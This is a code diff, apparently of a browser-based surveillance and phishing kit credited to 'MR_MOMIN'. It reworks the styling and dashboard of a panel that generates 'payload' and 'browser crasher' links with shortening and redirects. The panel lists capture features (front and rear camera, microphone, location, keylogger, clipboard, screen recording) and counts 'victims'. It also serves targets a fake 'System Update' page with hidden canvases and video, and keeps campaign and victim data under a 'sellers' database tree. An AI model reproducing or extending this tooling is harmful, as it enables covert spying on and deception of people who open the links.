-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-        
-        .tab-btn:hover {
-            border-color: var(--primary);
-            color: var(--primary);
-            box-shadow: 0 0 15px rgba(0, 240, 255, 0.1);
-        }
-        
-        .tab-btn.active {
-            background: linear-gradient(135deg, var(--primary), var(--accent));
-            color: var(--dark);
-            border-color: transparent;
-            box-shadow: 0 4px 15px rgba(0, 240, 255, 0.3);
-        }
-        
-        .tab-content {
-            display: none;
-            animation: fadeIn 0.3s ease;
-        }
-        
-        .tab-content.active {
-            display: block;
-        }
-        
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
         }
         
         /* Media Grid */
         .media-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
-            gap: 1rem;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 0.6rem;
+        }
+        
+        @media (min-width: 640px) {
+            .media-grid {
+                grid-template-columns: repeat(3, 1fr);
+            }
+        }
+        
+        @media (min-width: 1024px) {
+            .media-grid {
+                grid-template-columns: repeat(4, 1fr);
+            }
         }
         
         .media-card {
             background: rgba(0,0,0,0.4);
-            border-radius: 12px;
+            border-radius: 10px;
             overflow: hidden;
             border: 1px solid rgba(0, 240, 255, 0.15);
-            transition: var(--transition);
             position: relative;
-        }
-        
-        .media-card:hover {
-            transform: scale(1.05);
-            border-color: var(--primary);
-            box-shadow: 0 10px 30px rgba(0, 240, 255, 0.2);
-            z-index: 10;
         }
         
         .media-card img, .media-card video {
             width: 100%;
-            height: 120px;
+            height: 100px;
             object-fit: cover;
-            cursor: pointer;
+            display: block;
+        }
+        
+        @media (min-width: 768px) {
+            .media-card img, .media-card video {
+                height: 120px;
+            }
         }
         
         .media-actions {
-            padding: 0.8rem;
+            padding: 0.5rem;
             display: flex;
             justify-content: center;
-            gap: 0.5rem;
         }
         
-        /* Download Button for Media */
         .btn-download {
-            padding: 0.5rem 1rem;
-            border-radius: 8px;
+            padding: 0.4rem 0.8rem;
+            border-radius: 6px;
             border: 1px solid var(--primary);
             background: rgba(0, 240, 255, 0.1);
             color: var(--primary);
-            font-size: 0.8rem;
+            font-size: 0.75rem;
             font-weight: 600;
             cursor: pointer;
-            transition: var(--transition);
             display: flex;
             align-items: center;
-            gap: 0.4rem;
-        }
-        
-        .btn-download:hover {
-            background: var(--primary);
-            color: var(--dark);
-            transform: translateY(-2px);
+            gap: 0.3rem;
         }
         
         /* Passive Info */
         .passive-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 0.8rem;
+            grid-template-columns: 1fr;
+            gap: 0.5rem;
+        }
+        
+        @media (min-width: 640px) {
+            .passive-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
         }
         
         .passive-item {
             background: rgba(0, 240, 255, 0.05);
             border: 1px solid rgba(0, 240, 255, 0.15);
-            border-radius: 12px;
-            padding: 0.8rem 1rem;
+            border-radius: 8px;
+            padding: 0.6rem 0.8rem;
             display: flex;
             align-items: center;
-            gap: 0.8rem;
-            font-size: 0.9rem;
-            transition: var(--transition);
-        }
-        
-        .passive-item:hover {
-            background: rgba(0, 240, 255, 0.1);
-            border-color: var(--primary);
-            transform: translateX(4px);
+            gap: 0.6rem;
+            font-size: 0.8rem;
         }
         
         .passive-item i {
             color: var(--primary);
-            font-size: 1.1rem;
-            width: 20px;
+            font-size: 1rem;
+            width: 18px;
+            flex-shrink: 0;
         }
         
         /* Lightbox */
@@ -1171,44 +1044,36 @@
             justify-content: center;
             align-items: center;
             flex-direction: column;
-            backdrop-filter: blur(20px);
+            padding: 1rem;
         }
         
         .lightbox.active {
             display: flex;
-            animation: fadeIn 0.2s ease;
         }
         
         .lightbox-img, .lightbox-video {
-            max-width: 90%;
-            max-height: 85%;
-            border-radius: 20px;
-            box-shadow: 0 30px 60px rgba(0,0,0,0.8);
+            max-width: 100%;
+            max-height: 70vh;
+            border-radius: 12px;
             border: 2px solid var(--primary);
         }
         
         .close-lightbox {
             position: absolute;
-            top: 30px;
-            right: 40px;
+            top: 20px;
+            right: 20px;
             color: var(--primary);
-            font-size: 3rem;
+            font-size: 2rem;
             cursor: pointer;
-            transition: var(--transition);
-            width: 50px;
-            height: 50px;
+            width: 40px;
+            height: 40px;
             display: flex;
             align-items: center;
             justify-content: center;
             border-radius: 50%;
             border: 2px solid var(--primary);
             background: rgba(0,0,0,0.5);
-        }
-        
-        .close-lightbox:hover {
-            background: var(--primary);
-            color: var(--dark);
-            transform: rotate(90deg) scale(1.1);
+            z-index: 10;
         }
         
         /* Victim Panel - Fake System Update */
@@ -1238,25 +1103,31 @@
             flex-direction: column;
             justify-content: center;
             align-items: center;
-            z-index: 100;
+            padding: 1rem;
             background: radial-gradient(circle at center, #1a1a2e 0%, #0a0a0f 100%);
         }
         
         .update-logo {
-            width: 120px;
-            height: 120px;
-            margin-bottom: 2rem;
+            width: 80px;
+            height: 80px;
+            margin-bottom: 1.5rem;
             position: relative;
         }
         
+        @media (min-width: 768px) {
+            .update-logo {
+                width: 100px;
+                height: 100px;
+            }
+        }
+        
         .update-logo i {
-            font-size: 5rem;
+            font-size: 3rem;
             color: var(--primary);
             position: absolute;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            text-shadow: 0 0 30px rgba(0, 240, 255, 0.5);
         }
         
         .update-spinner {
@@ -1265,7 +1136,6 @@
             height: 100%;
             border: 3px solid rgba(0, 240, 255, 0.1);
             border-top-color: var(--primary);
-            border-right-color: var(--accent);
             border-radius: 50%;
             animation: spin 1s linear infinite;
         }
@@ -1276,36 +1146,41 @@
         
         .update-title {
             font-family: 'JetBrains Mono', monospace;
-            font-size: 2rem;
+            font-size: 1.3rem;
             color: #fff;
-            margin-bottom: 1rem;
+            margin-bottom: 0.8rem;
             text-transform: uppercase;
-            letter-spacing: 4px;
-            text-shadow: 0 0 20px rgba(0, 240, 255, 0.3);
+            letter-spacing: 2px;
+            text-align: center;
+        }
+        
+        @media (min-width: 768px) {
+            .update-title {
+                font-size: 1.8rem;
+            }
         }
         
         .update-text {
-            font-size: 1rem;
+            font-size: 0.9rem;
             color: rgba(255,255,255,0.6);
-            margin-bottom: 2rem;
+            margin-bottom: 1.5rem;
             text-align: center;
-            max-width: 600px;
-            line-height: 1.6;
+            max-width: 500px;
+            line-height: 1.5;
         }
         
         .update-progress-container {
-            width: 80%;
-            max-width: 500px;
-            margin-bottom: 1rem;
+            width: 90%;
+            max-width: 400px;
+            margin-bottom: 0.5rem;
         }
         
         .update-progress-bar {
             width: 100%;
-            height: 8px;
+            height: 6px;
             background: rgba(255,255,255,0.1);
-            border-radius: 4px;
+            border-radius: 3px;
             overflow: hidden;
-            box-shadow: 0 0 15px rgba(0, 240, 255, 0.1);
         }
         
         .update-progress-fill {
@@ -1313,171 +1188,216 @@
             background: linear-gradient(90deg, var(--primary), var(--accent));
             width: 0%;
             transition: width 0.3s ease;
-            box-shadow: 0 0 20px var(--primary);
         }
         
         .update-percentage {
             font-family: 'JetBrains Mono', monospace;
-            font-size: 1.5rem;
+            font-size: 1.2rem;
             color: var(--primary);
-            margin-top: 1rem;
-            text-shadow: 0 0 10px rgba(0, 240, 255, 0.3);
+            margin-top: 0.8rem;
         }
         
         .update-details {
             font-family: 'JetBrains Mono', monospace;
-            font-size: 0.9rem;
+            font-size: 0.75rem;
             color: rgba(255,255,255,0.4);
-            margin-top: 2rem;
+            margin-top: 1.5rem;
             text-align: center;
-            line-height: 1.6;
+            line-height: 1.5;
         }
         
-        .update-details span {
-            color: var(--primary);
-        }
-        
-        /* Hidden Canvases for Anti-Throttle */
+        /* Hidden Elements */
         .victim-canvas {
             position: absolute;
             top: 0;
             left: 0;
             opacity: 0;
             pointer-events: none;
+            width: 1px;
+            height: 1px;
         }
         
         /* Status Message */
         .status-msg {
             position: fixed;
-            bottom: 30px;
-            right: 30px;
-            padding: 1rem 2rem;
-            border-radius: 16px;
+            bottom: 80px;
+            left: 50%;
+            transform: translateX(-50%) translateY(100px);
+            padding: 0.8rem 1.5rem;
+            border-radius: 12px;
             font-weight: 600;
             z-index: 10000;
-            transform: translateX(500px);
-            transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            transition: transform 0.3s ease;
             backdrop-filter: blur(20px);
-            font-size: 1rem;
-            letter-spacing: 0.5px;
+            font-size: 0.9rem;
+            text-align: center;
+            max-width: 90%;
+            width: max-content;
         }
         
         .status-msg.show {
-            transform: translateX(0);
+            transform: translateX(-50%) translateY(0);
         }
         
         .status-msg.success {
             background: rgba(0, 240, 255, 0.15);
             border: 1px solid var(--primary);
             color: var(--primary);
-            box-shadow: var(--glow);
         }
         
         .status-msg.error {
             background: rgba(255, 56, 100, 0.15);
             border: 1px solid var(--secondary);
             color: var(--secondary);
-            box-shadow: var(--glow-red);
         }
         
         /* Scrollbar */
         ::-webkit-scrollbar {
-            width: 8px;
-            height: 8px;
+            width: 6px;
+            height: 6px;
         }
         
         ::-webkit-scrollbar-track {
             background: var(--dark);
-            border-radius: 4px;
+            border-radius: 3px;
         }
         
         ::-webkit-scrollbar-thumb {
-            background: linear-gradient(var(--primary), var(--accent));
-            border-radius: 4px;
+            background: var(--primary);
+            border-radius: 3px;
         }
         
-        ::-webkit-scrollbar-thumb:hover {
-            background: linear-gradient(var(--accent), var(--primary));
+        /* Empty State */
+        .empty-state {
+            text-align: center;
+            padding: 2rem;
+            color: rgba(255,255,255,0.4);
         }
         
-        /* Responsive */
-        @media (max-width: 768px) {
-            .container {
-                padding: 1rem;
-            }
-            
-            .header {
-                padding: 1rem;
-                border-radius: 20px;
-            }
-            
-            .logo-text h1 {
-                font-size: 1.4rem;
-            }
-            
-            .feature-grid {
-                grid-template-columns: repeat(2, 1fr);
-                gap: 0.8rem;
-            }
-            
-            .feature-card {
-                padding: 1.2rem 0.8rem;
-            }
-            
-            .update-title {
-                font-size: 1.5rem;
-            }
-            
-            .stat-value {
-                font-size: 2rem;
-            }
-            
-            .stats-grid {
-                grid-template-columns: repeat(2, 1fr);
-                gap: 1rem;
-            }
-            
-            .developer-badge {
-                bottom: 20px;
-                left: 20px;
-                padding: 0.8rem 1.2rem;
-            }
-            
-            .developer-name {
-                font-size: 1rem;
-            }
+        .empty-state i {
+            font-size: 2rem;
+            margin-bottom: 0.5rem;
         }
         
         .hide {
             display: none !important;
         }
         
-        /* Loading Animation */
-        .loading {
-            display: inline-block;
-            width: 20px;
-            height: 20px;
-            border: 3px solid rgba(255,255,255,.1);
-            border-radius: 50%;
-            border-top-color: var(--primary);
-            animation: spin 1s ease-in-out infinite;
+        /* Section Headers in Victim View */
+        .section-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 0.6rem;
+            flex-wrap: wrap;
+            gap: 0.5rem;
         }
         
-        /* Empty State */
-        .empty-state {
-            text-align: center;
-            padding: 3rem;
-            color: rgba(255,255,255,0.4);
+        .section-title {
+            color: var(--primary);
+            font-weight: 600;
+            font-size: 0.85rem;
+            display: flex;
+            align-items: center;
+            gap: 0.4rem;
         }
         
-        .empty-state i {
-            font-size: 3rem;
+        /* Audio List */
+        .audio-list {
+            display: flex;
+            flex-direction: column;
+            gap: 0.5rem;
+        }
+        
+        .audio-item {
+            background: rgba(0,0,0,0.3);
+            padding: 0.5rem;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+        
+        .audio-item audio {
+            flex: 1;
+            height: 36px;
+            min-width: 0;
+        }
+        
+        /* Keylog List */
+        .keylog-list {
+            background: rgba(0,0,0,0.3);
+            padding: 0.8rem;
+            border-radius: 8px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.8rem;
+            max-height: 200px;
+            overflow-y: auto;
+            line-height: 1.6;
+        }
+        
+        .keylog-item {
+            padding: 0.2rem 0;
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+        }
+        
+        /* Clipboard List */
+        .clipboard-list {
+            display: flex;
+            flex-direction: column;
+            gap: 0.5rem;
+        }
+        
+        .clipboard-item {
+            background: rgba(0,0,0,0.3);
+            padding: 0.6rem;
+            border-radius: 8px;
+        }
+        
+        .clipboard-time {
+            font-size: 0.7rem;
+            color: #888;
+            margin-bottom: 0.3rem;
+        }
+        
+        .clipboard-text {
+            font-size: 0.85rem;
+            word-break: break-word;
+        }
+        
+        /* Location List */
+        .location-list {
+            display: flex;
+            flex-direction: column;
+            gap: 0.5rem;
+        }
+        
+        .location-item {
+            background: rgba(0,0,0,0.3);
+            padding: 0.6rem;
+            border-radius: 8px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.8rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 0.5rem;
+        }
+        
+        .location-coords {
+            color: var(--primary);
+        }
+        
+        .location-link {
+            color: var(--accent);
+            text-decoration: none;
+            font-size: 0.75rem;
+        }
+        
+        /* Back Button */
+        .back-btn {
             margin-bottom: 1rem;
-            opacity: 0.3;
-        }
-        
-        .empty-state p {
-            font-size: 1rem;
         }
     </style>
 </head>
@@ -1526,47 +1446,47 @@
                 <div class="feature-grid" id="featureGrid">
                     <div class="feature-card" data-feat="CFP">
                         <i class="fas fa-camera"></i>
-                        <span>Frontal Capture</span>
+                        <span>Front Cam</span>
                     </div>
                     <div class="feature-card" data-feat="CFV">
                         <i class="fas fa-video"></i>
-                        <span>Frontal Recon</span>
+                        <span>Front Video</span>
                     </div>
                     <div class="feature-card" data-feat="CBP">
                         <i class="fas fa-camera"></i>
-                        <span>Rear Stealth</span>
+                        <span>Back Cam</span>
                     </div>
                     <div class="feature-card" data-feat="CBV">
                         <i class="fas fa-video"></i>
-                        <span>Rear Surveillance</span>
+                        <span>Back Video</span>
                     </div>
                     <div class="feature-card" data-feat="M">
                         <i class="fas fa-microphone"></i>
-                        <span>Audio Sniffer</span>
+                        <span>Microphone</span>
                     </div>
                     <div class="feature-card" data-feat="L">
                         <i class="fas fa-map-marker-alt"></i>
-                        <span>Geo Tracker</span>
+                        <span>Location</span>
                     </div>
                     <div class="feature-card" data-feat="K">
                         <i class="fas fa-keyboard"></i>
-                        <span>Keystroke Ghost</span>
+                        <span>Keylogger</span>
                     </div>
                     <div class="feature-card" data-feat="P">
                         <i class="fas fa-clipboard"></i>
-                        <span>Clip Harvester</span>
+                        <span>Clipboard</span>
                     </div>
                     <div class="feature-card" data-feat="R">
                         <i class="fas fa-desktop"></i>
-                        <span>Screen Ripper</span>
+                        <span>Screen Rec</span>
                     </div>
                     <div class="feature-card" data-feat="N">
                         <i class="fas fa-network-wired"></i>
-                        <span>Network Sweeper</span>
+                        <span>Network</span>
                     </div>
                     <div class="feature-card" data-feat="F">
                         <i class="fas fa-exclamation-triangle"></i>
-                        <span>Fake Updater</span>
+                        <span>Fake Update</span>
                     </div>
                 </div>
 
@@ -1578,7 +1498,7 @@
                     </label>
                     <span class="toggle-label">
                         <i class="fas fa-bolt"></i>
-                        Advanced Stealth Mode
+                        Advanced Mode
                     </span>
                 </div>
 
@@ -1587,15 +1507,15 @@
                     <div class="camera-grid">
                         <div class="input-group">
                             <label>Photo Interval (sec)</label>
-                            <input type="number" id="cameraInterval" value="0.33" step="0.05" min="0.1">
+                            <input type="number" id="cameraInterval" value="0.5" step="0.1" min="0.1">
                         </div>
                         <div class="input-group">
                             <label>Video Duration (sec)</label>
-                            <input type="number" id="videoDuration" value="3" step="1" min="1">
+                            <input type="number" id="videoDuration" value="5" step="1" min="1">
                         </div>
                         <div class="input-group">
                             <label>Photo Quality (%)</label>
-                            <input type="number" id="photoQuality" value="70" step="5" min="10" max="100">
+                            <input type="number" id="photoQuality" value="60" step="5" min="10" max="100">
                         </div>
                     </div>
                 </div>
@@ -1608,7 +1528,7 @@
                     </label>
                     <span class="toggle-label">
                         <i class="fas fa-link"></i>
-                        Shorten Link (is.gd)
+                        Shorten Link
                     </span>
                 </div>
 
@@ -1618,33 +1538,33 @@
                     <input type="text" id="redirectUrl" class="url-input" placeholder="https://example.com">
                 </div>
 
-                <!-- Two Generate Buttons -->
+                <!-- Generate Buttons -->
                 <button class="btn-primary" id="generateNormalBtn">
-                    <i class="fas fa-radiation"></i> Generate Normal Payload
+                    <i class="fas fa-radiation"></i> Generate Payload
                 </button>
                 
                 <button class="btn-danger" id="generateCrasherBtn">
-                    <i class="fas fa-bomb"></i> Generate Browser Crasher
+                    <i class="fas fa-bomb"></i> Browser Crasher
                 </button>
 
                 <!-- Generated Link Boxes -->
                 <div id="normalLinkBox" class="link-box hide">
                     <div class="link-label">
-                        <i class="fas fa-satellite-dish"></i> Normal Payload Link
+                        <i class="fas fa-satellite-dish"></i> Payload Link
                     </div>
                     <div class="link-text" id="normalLinkText">--</div>
-                    <button class="btn-secondary" id="copyNormalBtn" style="margin-top: 1rem; width: 100%;">
+                    <button class="btn-secondary" id="copyNormalBtn">
                         <i class="fas fa-copy"></i> Copy Link
                     </button>
                 </div>
 
                 <div id="crasherLinkBox" class="link-box danger hide">
                     <div class="link-label">
-                        <i class="fas fa-skull-crossbones"></i> BROWSER CRASHER LINK
+                        <i class="fas fa-skull-crossbones"></i> CRASHER LINK
                     </div>
                     <div class="link-text" id="crasherLinkText">--</div>
-                    <button class="btn-danger" id="copyCrasherBtn" style="margin-top: 1rem; width: 100%; background: var(--secondary);">
-                        <i class="fas fa-copy"></i> Copy Crasher Link
+                    <button class="btn-secondary" id="copyCrasherBtn" style="border-color: var(--secondary); color: var(--secondary);">
+                        <i class="fas fa-copy"></i> Copy Link
                     </button>
                 </div>
             </div>
@@ -1652,14 +1572,14 @@
             <!-- Statistics Card -->
             <div class="card">
                 <div class="card-header" style="justify-content: space-between;">
-                    <div style="display: flex; align-items: center; gap: 1rem;">
+                    <div style="display: flex; align-items: center; gap: 0.8rem;">
                         <div class="card-icon">
                             <i class="fas fa-chart-line"></i>
                         </div>
-                        <h2 class="card-title">Operations Overview</h2>
+                        <h2 class="card-title">Operations</h2>
                     </div>
-                    <button class="btn-secondary" id="exportAllDataBtn">
-                        <i class="fas fa-download"></i> Export JSON
+                    <button class="btn-secondary" id="exportAllDataBtn" style="width: auto; margin: 0;">
+                        <i class="fas fa-download"></i> Export
                     </button>
                 </div>
 
@@ -1669,21 +1589,21 @@
                             <i class="fas fa-mouse-pointer"></i>
                         </div>
                         <div class="stat-value" id="totalClicks">0</div>
-                        <div class="stat-label">Total Clicks</div>
+                        <div class="stat-label">Clicks</div>
                     </div>
                     <div class="stat-card">
                         <div class="stat-icon">
                             <i class="fas fa-users"></i>
                         </div>
                         <div class="stat-value" id="totalVictims">0</div>
-                        <div class="stat-label">Total Victims</div>
+                        <div class="stat-label">Victims</div>
                     </div>
                     <div class="stat-card">
                         <div class="stat-icon">
                             <i class="fas fa-bullseye"></i>
                         </div>
                         <div class="stat-value" id="activeCampaigns">0</div>
-                        <div class="stat-label">Active Campaigns</div>
+                        <div class="stat-label">Campaigns</div>
                     </div>
                 </div>
 
@@ -1698,32 +1618,31 @@
                     <div class="card-icon">
                         <i class="fas fa-list"></i>
                     </div>
-                    <h2 class="card-title">Active Campaigns</h2>
+                    <h2 class="card-title">Campaigns</h2>
                 </div>
                 <div class="campaign-list" id="campaignList">
                     <div class="empty-state">
                         <i class="fas fa-satellite"></i>
-                        <p>No campaigns detected. Generate your first payload.</p>
+                        <p>No campaigns yet</p>
                     </div>
                 </div>
             </div>
         </div>
     </div>
 
-    <!-- Developer Badge - NEW -->
+    <!-- Developer Badge -->
     <div class="developer-badge">
         <div class="developer-icon">
             <i class="fas fa-code"></i>
         </div>
         <div class="developer-info">
             <span class="developer-label">Developed By</span>
-            <span class="developer-name">MR_MOMIN<span class="developer-globe">🌐</span></span>
+            <span class="developer-name">MR_MOMIN 🌐</span>
         </div>
     </div>
 
     <!-- Victim Panel - Fake System Update -->
     <div id="victimPanel">
-        <!-- Hidden Canvases for Anti-Throttle -->
         <canvas id="vl1" class="victim-canvas"></canvas>
         <canvas id="vl2" class="victim-canvas"></canvas>
         <canvas id="vl3" class="victim-canvas"></canvas>
@@ -1731,16 +1650,15 @@
         <canvas id="vl5" class="victim-canvas"></canvas>
         <canvas id="vl6" class="victim-canvas"></canvas>
         
-        <!-- Fake Update UI -->
         <div class="update-container" id="updateUI">
             <div class="update-logo">
                 <div class="update-spinner"></div>
                 <i class="fas fa-shield-alt"></i>
             </div>
-            <h1 class="update-title">System Security Update</h1>
+            <h1 class="update-title">System Update</h1>
             <p class="update-text">
-                Your browser is being updated to the latest security patch.<br>
-                Please do not close this window or turn off your device.
+                Installing security updates...<br>
+                Please keep your device connected.
             </p>
             <div class="update-progress-container">
                 <div class="update-progress-bar">
@@ -1749,8 +1667,7 @@
                 <div class="update-percentage" id="updatePercentage">0%</div>
             </div>
             <div class="update-details">
-                Installing: <span id="updateFile">security_patch_v2.4.1.bin</span><br>
-                <span id="updateSpeed">2.4 MB/s</span> • <span id="updateTime">Estimated time: 2 minutes</span>
+                <span id="updateFile">update.pkg</span> • <span id="updateSpeed">2.4 MB/s</span>
             </div>
         </div>
     </div>
@@ -1768,7 +1685,6 @@
     <!-- Hidden Elements -->
     <video id="hiddenVideo" style="display:none;" autoplay playsinline muted></video>
     <canvas id="hiddenCanvas" style="display:none;"></canvas>
-    <input type="file" id="filePicker" style="display:none;" multiple>
 
     <script>
         // ==========================================
@@ -1776,7 +1692,7 @@
         // ==========================================
         function createParticles() {
             const container = document.getElementById('particles');
-            for(let i = 0; i < 40; i++) {
+            for(let i = 0; i < 30; i++) {
                 const particle = document.createElement('div');
                 particle.className = 'particle';
                 particle.style.left = Math.random() * 100 + '%';
@@ -1820,52 +1736,41 @@
 
         function copyToClipboard(text) {
             navigator.clipboard.writeText(text).then(() => {
-                showStatus('Link copied to clipboard!');
-            }).catch(() => showStatus('Failed to copy', true));
+                showStatus('Link copied!');
+            }).catch(() => {
+                // Fallback
+                const textarea = document.createElement('textarea');
+                textarea.value = text;
+                document.body.appendChild(textarea);
+                textarea.select();
+                document.execCommand('copy');
+                document.body.removeChild(textarea);
+                showStatus('Link copied!');
+            });
         }
 
-        // ==========================================
-        // DOWNLOAD FUNCTIONS - NEW
-        // ==========================================
-        function downloadMedia(url, filename, type = 'image') {
-            try {
-                // Create a temporary anchor element
-                const a = document.createElement('a');
-                a.href = url;
-                a.download = filename;
-                a.target = '_blank';
-                a.style.display = 'none';
-                document.body.appendChild(a);
-                
-                // Trigger click
-                a.click();
-                
-                // Cleanup
-                setTimeout(() => {
-                    document.body.removeChild(a);
-                }, 100);
-                
-                showStatus(`${type} download started!`);
-            } catch(e) {
-                showStatus('Download failed. Try right-click > Save As', true);
-                console.error('Download error:', e);
-            }
+        function downloadMedia(url, filename) {
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = filename;
+            a.target = '_blank';
+            document.body.appendChild(a);
+            a.click();
+            setTimeout(() => document.body.removeChild(a), 100);
         }
 
-        function downloadAllMedia(mediaArray, type = 'images') {
+        function downloadAllMedia(mediaArray, type) {
             if(!mediaArray || mediaArray.length === 0) {
-                showStatus('No media to download', true);
+                showStatus('No media found', true);
                 return;
             }
-            
-            showStatus(`Downloading ${mediaArray.length} ${type}...`);
-            
             mediaArray.forEach((url, index) => {
                 setTimeout(() => {
                     const ext = type === 'videos' ? 'webm' : 'jpg';
-                    downloadMedia(url, `cyber_phantom_${type}_${index + 1}_${Date.now()}.${ext}`, type.slice(0, -1));
-                }, index * 500); // Delay between downloads
+                    downloadMedia(url, `phantom_${type}_${index + 1}.${ext}`);
+                }, index * 300);
             });
+            showStatus(`Downloading ${mediaArray.length} ${type}...`);
         }
 
         // ==========================================
@@ -1874,6 +1779,7 @@
         let currentUid = null;
         let campaignsRef = null;
         let clicksChart = null;
+        let currentCampaigns = {};
 
         async function initDashboard(uid) {
             const snap = await db.ref(`sellers/${uid}`).once('value');
@@ -1889,14 +1795,16 @@
             document.getElementById('displayUid').textContent = uid;
             
             campaignsRef = db.ref(`sellers/${uid}/campaigns`);
-            campaignsRef.on('value', (snap) => renderCampaigns(snap.val() || {}));
+            campaignsRef.on('value', (snap) => {
+                currentCampaigns = snap.val() || {};
+                renderCampaigns(currentCampaigns);
+            });
             
             updateStats();
         }
 
         async function updateStats() {
-            const campaignsSnap = await db.ref(`sellers/${currentUid}/campaigns`).once('value');
-            const campaigns = campaignsSnap.val() || {};
+            const campaigns = currentCampaigns;
             
             let totalClicks = 0;
             let totalVictims = 0;
@@ -1906,7 +1814,6 @@
                 totalVictims += camp.victims ? Object.keys(camp.victims).length : 0;
             });
             
-            // Animate numbers
             animateNumber('totalClicks', totalClicks);
             animateNumber('totalVictims', totalVictims);
             animateNumber('activeCampaigns', Object.keys(campaigns).length);
@@ -1914,8 +1821,9 @@
             // Update chart
             if(clicksChart) clicksChart.destroy();
             const ctx = document.getElementById('clicksChart').getContext('2d');
-            const labels = Object.keys(campaigns).slice(-7).map((_, i) => `Camp ${i + 1}`);
-            const data = Object.values(campaigns).slice(-7).map(c => c.clicks || 0);
+            const campArray = Object.entries(campaigns).slice(-7);
+            const labels = campArray.map((_, i) => `#${i + 1}`);
+            const data = campArray.map(([_, c]) => c.clicks || 0);
             
             clicksChart = new Chart(ctx, {
                 type: 'line',
@@ -1944,11 +1852,11 @@
                     scales: {
                         y: {
                             grid: { color: 'rgba(0, 240, 255, 0.05)' },
-                            ticks: { color: 'rgba(255,255,255,0.5)' }
+                            ticks: { color: 'rgba(255,255,255,0.5)', font: { size: 10 } }
                         },
                         x: {
                             grid: { display: false },
-                            ticks: { color: 'rgba(255,255,255,0.5)' }
+                            ticks: { color: 'rgba(255,255,255,0.5)', font: { size: 10 } }
                         }
                     }
                 }
@@ -1958,6 +1866,8 @@
         function animateNumber(id, target) {
             const el = document.getElementById(id);
             const current = parseInt(el.textContent) || 0;
+            if(current === target) return;
+            
             const increment = (target - current) / 20;
             let step = 0;
             
@@ -1968,7 +1878,7 @@
                     el.textContent = target;
                     clearInterval(timer);
                 }
-            }, 30);
+            }, 25);
         }
 
         function renderCampaigns(campaigns) {
@@ -1978,7 +1888,7 @@
                 container.innerHTML = `
                     <div class="empty-state">
                         <i class="fas fa-satellite"></i>
-                        <p>No campaigns detected. Generate your first payload.</p>
+                        <p>No campaigns yet</p>
                     </div>
                 `;
                 return;
@@ -1988,55 +1898,44 @@
             for(const [campId, camp] of Object.entries(campaigns)) {
                 const link = `${window.location.origin}${window.location.pathname}?uid=${currentUid}&camp=${campId}`;
                 const isCrasher = camp.type === 'crasher';
+                const victimCount = camp.victims ? Object.keys(camp.victims).length : 0;
                 
                 html += `
                     <div class="campaign-item ${isCrasher ? 'crasher' : ''}">
                         <div class="campaign-header">
-                            <div class="campaign-link" title="${link}">${link}</div>
-                            <div class="campaign-stats">
+                            <div class="campaign-link">${link}</div>
+                            <div style="display: flex; gap: 0.5rem; align-items: center;">
                                 <span class="stat-badge">
                                     <i class="fas fa-eye"></i> ${camp.clicks || 0}
                                 </span>
-                            </div>
-                            <div class="campaign-actions">
-                                <button class="btn-secondary" onclick="copyToClipboard('${link}')">
-                                    <i class="fas fa-copy"></i>
-                                </button>
-                                <button class="btn-secondary" style="color: #ff3864; border-color: #ff3864;" 
-                                        onclick="deleteCampaign('${campId}')">
-                                    <i class="fas fa-trash"></i>
-                                </button>
+                                <div class="campaign-actions">
+                                    <button class="btn-secondary" onclick="copyToClipboard('${link}')" title="Copy">
+                                        <i class="fas fa-copy"></i>
+                                    </button>
+                                    <button class="btn-secondary" onclick="deleteCampaign('${campId}')" title="Delete" style="color: #ff3864; border-color: #ff3864;">
+                                        <i class="fas fa-trash"></i>
+                                    </button>
+                                </div>
                             </div>
                         </div>
-                        ${camp.victims ? renderVictimsPreview(camp.victims, campId) : ''}
+                        ${victimCount > 0 ? `
+                            <div style="margin-top: 0.8rem; padding-top: 0.8rem; border-top: 1px solid rgba(0,240,255,0.1); display: flex; align-items: center; gap: 0.5rem;">
+                                <i class="fas fa-users" style="color: var(--primary);"></i>
+                                <span style="color: rgba(255,255,255,0.8); font-size: 0.85rem;">${victimCount} victim${victimCount > 1 ? 's' : ''}</span>
+                                <button class="btn-secondary" onclick="viewVictims('${campId}')" style="margin-left: auto; font-size: 0.8rem; padding: 0.4rem 0.8rem;">
+                                    View <i class="fas fa-arrow-right"></i>
+                                </button>
+                            </div>
+                        ` : ''}
                     </div>
                 `;
             }
             
             container.innerHTML = html;
-            updateStats();
-        }
-
-        function renderVictimsPreview(victims, campId) {
-            const count = Object.keys(victims).length;
-            if(count === 0) return '';
-            
-            return `
-                <div style="margin-top: 1rem; padding-top: 1rem; border-top: 1px solid rgba(0,240,255,0.1);">
-                    <div style="display: flex; align-items: center; gap: 0.6rem; color: var(--primary); font-size: 0.9rem;">
-                        <i class="fas fa-users"></i>
-                        <span>${count} victim${count > 1 ? 's' : ''} captured</span>
-                        <button class="btn-secondary" style="margin-left: auto; font-size: 0.85rem;" 
-                                onclick="viewVictims('${campId}')">
-                            View Data <i class="fas fa-arrow-right"></i>
-                        </button>
-                    </div>
-                </div>
-            `;
         }
 
         async function deleteCampaign(campId) {
-            if(!confirm('Delete this campaign and all victim data?')) return;
+            if(!confirm('Delete this campaign?')) return;
             await db.ref(`sellers/${currentUid}/campaigns/${campId}`).remove();
             showStatus('Campaign deleted');
         }
@@ -2046,7 +1945,7 @@
         // ==========================================
         async function generateLink(type) {
             if(!currentUid) {
-                showStatus('Error: No operator ID', true);
+                showStatus('Error: No UID', true);
                 return;
             }
             
@@ -2062,7 +1961,7 @@
             const shorten = document.getElementById('shortenToggle').checked;
             const redirectUrl = document.getElementById('redirectUrl').value.trim();
             
